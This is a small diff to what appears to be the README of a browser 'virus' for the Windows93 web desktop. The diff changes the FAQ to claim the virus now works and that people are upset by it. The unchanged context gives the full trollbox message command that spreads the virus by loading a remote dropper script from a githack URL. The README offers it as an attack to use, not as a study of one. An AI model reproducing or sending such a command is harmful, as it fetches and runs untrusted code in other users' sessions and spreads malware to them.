@@ -9,7 +9,7 @@ Spread via trollbox as message:
 `/exe js $loader(["https://raw.githack.com/OutRite/Basic93Virus/main/dropper.js", $noop])`
 
 ## Does it work?
-no
+YES apparently. Never seen it for myself but some people are crying about it now ._.
 
 ## Why does it sometimes take long to update
-its just fucking githack
+githack is not ok
